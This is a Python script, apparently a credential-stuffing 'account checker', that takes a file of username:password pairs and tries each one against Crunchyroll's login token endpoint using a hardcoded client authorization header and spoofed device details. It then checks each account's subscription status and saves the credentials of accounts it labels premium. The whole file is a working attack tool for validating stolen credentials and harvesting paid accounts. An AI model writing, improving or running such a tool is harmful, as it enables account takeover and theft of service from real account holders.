import requests
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time
import os

# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ANSI escape codes for colors
class DTechColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def generate_guid():
    return str(uuid.uuid4())

def create_session_with_retries():
    session = requests.Session()
    retries = Retry(
        total=5,  # Number of retries
        backoff_factor=0.5,  # Delay factor for retries (0.5s, 1s, 2s, etc.)
        status_forcelist=[500, 502, 503, 504],  # HTTP status codes to retry on
        raise_on_status=False
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def check_account(session, username, password):
    # Generate a unique device ID
    device_id = generate_guid()

    # Step 1: Obtain access token
    token_url = "https://www.crunchyroll.com/auth/v1/token"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic eHd4cXhxcmtueWZtZjZ0bHB1dGg6a1ZlQnVUa2JOTGpCbGRMdzhKQk5DTTRSZmlTR3VWa1I=",
    }
    payload = {
        "username": username,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G988N",
        "device_type": "samsung SM-G965N"
    }

    try:
        response = session.post(token_url, data=payload, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors

        if "access_token" not in response.json():
            print(f"{DTechColors.FAIL}Failed to obtain access token for {username}.{DTechColors.ENDC}")
            return None

        access_token = response.json().get("access_token")
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 401:
            print(f"{DTechColors.WARNING}Account {username} is not active.{DTechColors.ENDC}")
        else:
            print(f"{DTechColors.FAIL}An error occurred while obtaining the access token for {username}: {e}{DTechColors.ENDC}")
        return None

    # Step 2: Fetch account information
    account_info_url = "https://www.crunchyroll.com/accounts/v1/me"
    headers["Authorization"] = f"Bearer {access_token}"

    try:
        response = session.get(account_info_url, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        external_id = response.json().get("external_id")
        if not external_id:
            print(f"{DTechColors.FAIL}Failed to extract external ID for {username}.{DTechColors.ENDC}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{DTechColors.FAIL}An error occurred while fetching account information for {username}: {e}{DTechColors.ENDC}")
        return None

    # Step 3: Fetch subscription information
    subscription_url = f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"

    try:
        response = session.get(subscription_url, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors

        subscription_data = response.json()
        plan = subscription_data.get("benefit", "Unknown")
        country = subscription_data.get("subscription_country", "Unknown")

        # Check if premium or non-premium
        if plan == "Unknown":
            print(f"{DTechColors.OKGREEN}Account {username} is Premium.{DTechColors.ENDC}")
            return "premium"
        else:
            print(f"{DTechColors.WARNING}Account {username} is Non-Premium. Plan: {plan}{DTechColors.ENDC}")
            return "non_premium"

    except requests.exceptions.RequestException as e:
        print(f"{DTechColors.FAIL}An error occurred while fetching subscription information for {username}: {e}{DTechColors.ENDC}")
        return None

def main():
    clear_screen()

    print(f"{DTechColors.OKCYAN}[D-TECH SYSTEMS LOADING...]{DTechColors.ENDC}")
    time.sleep(1)
    print(f"{DTechColors.OKGREEN}[INFO] Booting up, please wait...{DTechColors.ENDC}")
    time.sleep(1)

    # Prompt the user for file paths
    input_file = input(f"{DTechColors.BOLD}[D-TECH] Enter the path to the accounts file:{DTechColors.ENDC} ")
    output_file = input(f"{DTechColors.BOLD}[D-TECH] Enter the path to save premium accounts:{DTechColors.ENDC} ")

    try:
        with open(input_file, 'r') as f:
            accounts = f.readlines()
    except FileNotFoundError:
        print(f"{DTechColors.FAIL}[ERROR] The file {input_file} was not found.{DTechColors.ENDC}")
        return

    premium_accounts = []
    non_premium_accounts = []

    for account in accounts:
        username, password = account.strip().split(':')  # Assuming the format is "username:password"
        result = check_account(session, username, password)

        if result == "premium":
            premium_accounts.append(f"{username}:{password}")
        elif result == "non_premium":
            non_premium_accounts.append(f"{username}:{password}")

    clear_screen()

    print(f"{DTechColors.OKCYAN}[INFO] Sorting accounts based on subscription status...{DTechColors.ENDC}")
    time.sleep(2)

    # Save premium accounts to the user-specified file
    try:
        with open(output_file, 'w') as f:
            f.write("\n".join(premium_accounts))
    except Exception as e:
        print(f"{DTechColors.FAIL}[ERROR] Failed to save premium accounts: {e}{DTechColors.ENDC}")

    print(f"{DTechColors.OKGREEN}[SUCCESS] Premium accounts saved to {output_file}{DTechColors.ENDC}")

if __name__ == "__main__":
    session = create_session_with_retries()
    main()